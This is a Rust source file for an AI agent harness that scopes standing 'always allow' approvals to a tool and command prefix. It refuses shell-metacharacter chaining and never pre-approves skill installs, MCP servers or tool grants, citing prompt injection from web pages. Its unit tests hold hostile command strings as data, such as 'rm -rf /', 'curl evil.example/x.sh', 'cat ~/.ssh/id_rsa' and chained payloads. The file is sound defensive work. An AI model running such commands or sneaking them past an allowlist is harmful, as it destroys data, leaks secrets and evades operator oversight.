//! Standing approvals, scoped.
//!
//! "Always allow" used to persist the bare tool name, so agreeing to one
//! `git status` handed the agent every shell command it would ever ask for. A
//! rule is now the tool *and* the shape of the call it covers:
//!
//! ```text
//! Bash(git push …)   covers `git push origin main`, refuses `rm -rf /`
//! Write              covers Write, refuses Bash
//! ```
//!
//! Three rules hold the whole safety property:
//!
//! 1. A call that carries a command can only be covered by a rule that names a
//!    command prefix. A bare `Bash` rule — including one left behind in an
//!    older settings file by the bug above — covers no shell call at all.
//! 2. A prefix has to end on a word boundary, so `git push` does not cover
//!    `git pushall`.
//! 3. A command containing shell metacharacters is never covered, and never
//!    becomes a rule, so `git status; rm -rf /` cannot ride in on `git status`.

use serde::{Deserialize, Serialize};
use ts_rs::TS;

/// One standing allowance.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, TS)]
pub struct AllowRule {
    pub tool: String,
    /// The leading words of the command this rule covers. `None` means the tool
    /// takes no command at all — see rule 1 above.
    #[serde(skip_serializing_if = "Option::is_none")]
    #[ts(optional)]
    pub command: Option<String>,
}

/// Older settings files stored a plain string: `"Bash"` or `"Bash(git push"`.
#[derive(Deserialize)]
#[serde(untagged)]
enum Stored {
    Legacy(String),
    Rule {
        tool: String,
        #[serde(default)]
        command: Option<String>,
    },
}

impl<'de> Deserialize<'de> for AllowRule {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        Ok(match Stored::deserialize(d)? {
            Stored::Legacy(raw) => Self::from_legacy(&raw),
            Stored::Rule { tool, command } => Self {
                tool: tool.trim().to_string(),
                command: command
                    .map(|c| c.trim().to_string())
                    .filter(|c| !c.is_empty()),
            },
        })
    }
}

/// Characters that turn one command into several, or smuggle another one in. A
/// rule covers a single command, so any of these means "ask me".
const SHELL_META: [&str; 11] = [";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "\r", "&"];

/// Words that only mean something with the subcommand that follows, so the rule
/// is worth two tokens instead of one: `git push`, not all of `git`.
const TWO_WORD: [&str; 14] = [
    "git", "cargo", "npm", "pnpm", "yarn", "docker", "gh", "go", "dotnet", "uv", "pip", "poetry",
    "make", "kubectl",
];

/// Tools that run whatever they are given. A rule for one of these is
/// meaningless without a command scope, whatever the input looked like.
pub const SHELL_TOOLS: [&str; 4] = ["bash", "shell", "sh", "powershell"];

fn is_shell_tool(tool: &str) -> bool {
    let name = tool.trim().to_ascii_lowercase();
    let head = name.split('(').next().unwrap_or(&name).trim();
    SHELL_TOOLS.contains(&head)
}

fn looks_like_a_word(token: &str) -> bool {
    !token.is_empty()
        && token
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '/' | '\\'))
}

pub fn has_shell_meta(command: &str) -> bool {
    SHELL_META.iter().any(|m| command.contains(m))
}

/// The command a tool call is about, when it has one.
pub fn command_of(input: &serde_json::Value) -> Option<String> {
    for key in ["command", "cmd"] {
        if let Some(text) = input.get(key).and_then(|v| v.as_str()) {
            let trimmed = text.trim();
            if !trimmed.is_empty() {
                return Some(trimmed.to_string());
            }
        }
    }
    None
}

/// Calls that can be approved but never *pre*-approved.
///
/// A standing allowance is the operator saying "stop asking me about this".
/// That is reasonable for reading a file and unreasonable for widening what an
/// agent may do: one careless "always allow" would turn every future grant into
/// a silent one, and the whole point of the gate is that the operator sees each
/// one. Approving a grant is a decision about a specific agent and a specific
/// reach; there is no version of it that is safe to answer in advance.
///
/// All three grants sit here for the same reason, and the reason is sharper
/// for two of them than for tools: a skill is markdown the model went and
/// found, and an MCP server is code the model went and found. Standing
/// approval for either means the next page that says "also install this" is
/// installed without anyone reading it — which is exactly the injection the
/// declaration was designed to make visible.
pub const NEVER_STANDING: &[&str] = &[
    "grant_agent_tools",
    "mcp__harness__grant_agent_tools",
    "install_skill",
    "mcp__harness__install_skill",
    "add_mcp_server",
    "mcp__harness__add_mcp_server",
];

/// Is this a call no standing rule may ever cover?
pub fn never_standing(tool: &str) -> bool {
    let tool = tool.trim();
    NEVER_STANDING
        .iter()
        .any(|guarded| guarded.eq_ignore_ascii_case(tool))
}

impl AllowRule {
    pub fn tool_only(tool: impl Into<String>) -> Self {
        Self {
            tool: tool.into(),
            command: None,
        }
    }

    pub fn scoped(tool: impl Into<String>, command: impl Into<String>) -> Self {
        Self {
            tool: tool.into(),
            command: Some(command.into()),
        }
    }

    fn from_legacy(raw: &str) -> Self {
        match raw.split_once('(') {
            Some((tool, rest)) => {
                let prefix = rest.trim_end_matches(')').trim();
                if prefix.is_empty() {
                    Self::tool_only(tool.trim())
                } else {
                    Self::scoped(tool.trim(), prefix)
                }
            }
            None => Self::tool_only(raw.trim()),
        }
    }

    /// A rule that can never cover anything: what an unscoped shell allowance
    /// from an older settings file becomes. Kept in the list rather than
    /// silently dropped, so the operator can see it was revoked.
    pub fn is_inert(&self) -> bool {
        self.tool.trim().is_empty() || (self.command.is_none() && is_shell_tool(&self.tool))
    }

    /// The rule a standing approval for this call should be recorded as, or
    /// `None` when this is not the kind of call to grant standing permission
    /// for — a chained shell command, or one we cannot scope.
    pub fn derive(tool: &str, input: &serde_json::Value) -> Option<Self> {
        let tool = tool.trim();
        if tool.is_empty() {
            return None;
        }
        // A grant cannot become standing, so no rule is written for one. It was
        // already refused at `covers`, which meant the operator could tick
        // "stop asking me about this", watch the rule appear in Settings, and
        // still be asked every time — a promise on screen that nothing kept.
        if never_standing(tool) {
            return None;
        }
        match command_of(input) {
            Some(command) => {
                if has_shell_meta(&command) {
                    return None;
                }
                Some(Self::scoped(tool, Self::prefix_of(&command)?))
            }
            // A shell tool with no readable command cannot be scoped, so it
            // cannot be granted standing permission either.
            None if is_shell_tool(tool) => None,
            None => Some(Self::tool_only(tool)),
        }
    }

    /// The leading words worth remembering: `git push origin main` becomes
    /// `git push`, `rm -rf /` becomes `rm`.
    fn prefix_of(command: &str) -> Option<String> {
        let mut tokens = command.split_whitespace();
        let first = tokens.next().filter(|t| looks_like_a_word(t))?;
        if TWO_WORD.contains(&first.to_ascii_lowercase().as_str()) {
            if let Some(second) = tokens.next().filter(|t| looks_like_a_word(t)) {
                return Some(format!("{first} {second}"));
            }
        }
        Some(first.to_string())
    }

    /// Does this rule cover the call? `summary` is the fallback for adapters
    /// that hand us prose instead of the input object.
    pub fn covers(&self, tool: &str, input: &serde_json::Value, summary: &str) -> bool {
        if self.is_inert()
            || never_standing(tool)
            || !self.tool.trim().eq_ignore_ascii_case(tool.trim())
        {
            return false;
        }
        let command = command_of(input).or_else(|| Self::command_from_summary(summary));
        match (&self.command, command) {
            // A call with a command needs a rule that names one.
            (None, Some(_)) => false,
            (None, None) => true,
            (Some(_), None) => false,
            (Some(prefix), Some(command)) => {
                let prefix = prefix.trim();
                if prefix.is_empty() || has_shell_meta(&command) || has_shell_meta(prefix) {
                    return false;
                }
                match command.trim().strip_prefix(prefix) {
                    Some(rest) => rest.is_empty() || rest.starts_with(char::is_whitespace),
                    None => false,
                }
            }
        }
    }

    /// The adapters summarise a call as `command: git push | …`. Read the
    /// command back out so a rule still applies when that is all we have.
    fn command_from_summary(summary: &str) -> Option<String> {
        let text = summary.trim();
        let rest = text.strip_prefix("command:")?;
        let command = rest.split(" | ").next().unwrap_or(rest).trim();
        if command.is_empty() {
            None
        } else {
            Some(command.to_string())
        }
    }

    /// How the rule reads in the UI.
    pub fn label(&self) -> String {
        match &self.command {
            Some(prefix) => format!("{}({prefix} …)", self.tool),
            None => self.tool.clone(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn bash(command: &str) -> serde_json::Value {
        json!({ "command": command })
    }

    #[test]
    fn a_scoped_git_rule_does_not_authorise_other_shell_commands() {
        let rule = AllowRule::derive("Bash", &bash("git push origin main")).unwrap();
        assert_eq!(rule, AllowRule::scoped("Bash", "git push"));

        assert!(rule.covers("Bash", &bash("git push origin main"), ""));
        assert!(rule.covers("Bash", &bash("git push"), ""));

        for other in [
            "rm -rf /",
            "git commit -am wip",
            "curl http://example.com/x.sh",
            "npm publish",
            "git pushall --force",
            "cat ~/.ssh/id_rsa",
        ] {
            assert!(
                !rule.covers("Bash", &bash(other), ""),
                "a `git push` allowance must not authorise `{other}`"
            );
        }
        // Nor another tool entirely.
        assert!(!rule.covers("Write", &bash("git push"), ""));
    }

    #[test]
    fn widening_an_agents_reach_can_never_become_standing() {
        // Even a rule that names it exactly, with nothing else to disqualify it.
        let rule = AllowRule {
            tool: "grant_agent_tools".to_string(),
            command: None,
        };
        assert!(
            !rule.covers("grant_agent_tools", &serde_json::json!({}), ""),
            "one careless 'always allow' would make every future grant silent"
        );
        assert!(never_standing("mcp__harness__grant_agent_tools"));
        // The two grants that arrive from something the model read on the web
        // are held to the same line, and for a sharper reason: a standing yes
        // would install the next one without anyone reading it.
        for grant in [
            "install_skill",
            "mcp__harness__install_skill",
            "add_mcp_server",
            "mcp__harness__add_mcp_server",
        ] {
            assert!(never_standing(grant), "{grant} must be asked every time");
            let named = AllowRule { tool: grant.to_string(), command: None };
            assert!(!named.covers(grant, &serde_json::json!({}), ""));
            // And no rule is even written: a rule that appears in Settings and
            // authorises nothing is a promise the screen does not keep.
            assert!(AllowRule::derive(grant, &serde_json::json!({})).is_none());
        }
        assert!(!never_standing("create_card"), "ordinary calls still allow standing rules");
    }

    #[test]
    fn chaining_never_rides_in_on_a_rule() {
        let rule = AllowRule::scoped("Bash", "git status");
        assert!(rule.covers("Bash", &bash("git status --short"), ""));
        for sneaky in [
            "git status; rm -rf /",
            "git status && curl evil.example/x.sh",
            "git status `whoami`",
            "git status $(rm x)",
            "git status > /etc/hosts",
            "git status\nrm -rf /",
            "git status | tee /tmp/x",
        ] {
            assert!(
                !rule.covers("Bash", &bash(sneaky), ""),
                "`{sneaky}` must not be covered"
            );
        }
        // And there is no standing rule to be had from such a command at all.
        assert!(AllowRule::derive("Bash", &bash("git status; rm -rf /")).is_none());
    }

    #[test]
    fn a_bare_shell_rule_authorises_nothing() {
        // Exactly the entry the old implementation wrote.
        let legacy: AllowRule = serde_json::from_str("\"Bash\"").unwrap();
        assert_eq!(legacy, AllowRule::tool_only("Bash"));
        assert!(legacy.is_inert(), "an unscoped shell allowance is revoked");
        assert!(!legacy.covers("Bash", &bash("git push"), "command: git push"));
        assert!(!legacy.covers("Bash", &json!({}), "command: rm -rf /"));
        assert!(!legacy.covers("Bash", &json!({}), ""));
        // And we never mint one, even when the input has no readable command.
        assert!(AllowRule::derive("Bash", &json!({})).is_none());
    }

    #[test]
    fn legacy_prefixed_entries_still_load_and_still_hold() {
        let legacy: AllowRule = serde_json::from_str("\"Bash(git push\"").unwrap();
        assert_eq!(legacy, AllowRule::scoped("Bash", "git push"));
        assert!(!legacy.is_inert());
        assert!(legacy.covers("Bash", &bash("git push origin main"), ""));
        assert!(!legacy.covers("Bash", &bash("rm -rf /"), ""));
    }

    #[test]
    fn a_rule_still_applies_when_only_the_summary_is_available() {
        let rule = AllowRule::scoped("Bash", "cargo test");
        assert!(rule.covers("Bash", &json!({}), "command: cargo test --workspace"));
        assert!(!rule.covers("Bash", &json!({}), "command: cargo publish"));
        assert!(!rule.covers("Bash", &json!({}), "command: cargo test; rm -rf /"));
        assert!(!rule.covers("Bash", &json!({}), "nothing useful here"));
    }

    #[test]
    fn tools_without_a_command_are_matched_by_name() {
        let rule = AllowRule::derive("Write", &json!({ "file_path": "src/lib.rs" })).unwrap();
        assert_eq!(rule, AllowRule::tool_only("Write"));
        assert!(rule.covers("write", &json!({ "file_path": "other.rs" }), ""));
        assert!(!rule.covers("Edit", &json!({}), ""));
    }

    #[test]
    fn prefixes_are_one_word_or_two_where_that_is_the_meaning() {
        let cases = [
            ("git push origin main", "git push"),
            ("cargo test --workspace", "cargo test"),
            ("npm run build", "npm run"),
            ("rm -rf /", "rm"),
            ("ls", "ls"),
            ("git", "git"),
        ];
        for (command, expected) in cases {
            assert_eq!(
                AllowRule::derive("Bash", &bash(command))
                    .unwrap()
                    .command
                    .as_deref(),
                Some(expected),
                "{command}"
            );
        }
    }

    #[test]
    fn rules_round_trip_and_read_plainly() {
        let rules = vec![
            AllowRule::scoped("Bash", "git push"),
            AllowRule::tool_only("Write"),
        ];
        let raw = serde_json::to_string(&rules).unwrap();
        assert_eq!(rules, serde_json::from_str::<Vec<AllowRule>>(&raw).unwrap());
        assert_eq!(rules[0].label(), "Bash(git push …)");
        assert_eq!(rules[1].label(), "Write");
    }

    #[test]
    fn a_mixed_old_and_new_file_loads() {
        let raw = r#"["Bash(git status", "Write", {"tool":"Bash","command":"cargo test"}]"#;
        let rules: Vec<AllowRule> = serde_json::from_str(raw).unwrap();
        assert_eq!(
            rules,
            vec![
                AllowRule::scoped("Bash", "git status"),
                AllowRule::tool_only("Write"),
                AllowRule::scoped("Bash", "cargo test"),
            ]
        );
    }
}
